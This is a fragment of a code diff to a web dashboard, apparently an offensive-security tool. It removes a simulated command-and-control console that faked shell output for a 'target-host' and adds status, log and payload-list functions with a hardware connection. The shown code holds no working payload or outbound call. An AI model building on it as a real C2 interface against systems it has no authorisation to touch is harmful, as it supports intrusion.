-  }
-  // Simulate response
-  setTimeout(() => {
-    c2OutputLog(`[192.168.1.55] $ ${cmd}`);
-    simulateOutput(cmd);
-    document.getElementById('c2ResultLabel').textContent = 'Last: ' + cmd.substring(0,20);
-  }, 1500 + Math.random()*1000);
+function updateExecStatus(msg){
+    document.getElementById("execStatus").innerHTML=`Status: ${msg.status||"unknown"}<br>Progress: ${msg.progress||0}%<br>Last: ${PM.esc(msg.last_cmd||"")}`;
+    progressSpark.push(msg.progress||0);
 }
 
-function simulateOutput(cmd) {
-  const outputs = {
-    'whoami':       'user\n',
-    'id':           'uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom)\n',
-    'uname -a':     'Linux target-host 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 GNU/Linux\n',
-    'pwd':          '/home/user\n',
-    'ls':           'Desktop  Documents  Downloads  Music  Pictures  Videos\n',
-    'ifconfig':     'eth0: 192.168.1.55  UP RUNNING\nlo: 127.0.0.1  UP LOOPBACK\n',
-    'hostname':     'target-host\n',
-  };
-  const out = outputs[cmd] || `Command output for: ${cmd}\n(simulated)\n`;
-  out.split('\n').filter(l=>l).forEach(l=>c2OutputLog('  '+l));
+function addLog(msg){
+    const log=document.getElementById("execLog");
+    log.innerHTML=`<span style="color:var(--text-dim)">${new Date().toLocaleTimeString()} </span>${PM.esc(msg)}<br>`+log.innerHTML;
 }
 
-function c2Log(msg,cls='r-info'){const b=document.getElementById('c2ServerLog');const s=document.createElement('span');s.className=cls;s.textContent=msg;b.appendChild(s);b.appendChild(document.createElement('br'));b.scrollTop=b.scrollHeight;}
-function c2OutputLog(msg){const b=document.getElementById('c2OutputLog');const s=document.createElement('span');s.style.color='var(--accent3)';s.textContent=msg;b.appendChild(s);b.appendChild(document.createElement('br'));b.scrollTop=b.scrollHeight;}
-function clearC2Output(){document.getElementById('c2OutputLog').innerHTML='';}
-function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-
-// ── Init ──────────────────────────────────────────────────────────────────
-window.addEventListener('load', renderTargetLists);
+window.addEventListener("load",async()=>{
+    initViz(); renderPayloadList();
+    try{await beam.connect();}catch(e){console.log("No hardware — demo mode");}
+});
 </script>
 </body></html>
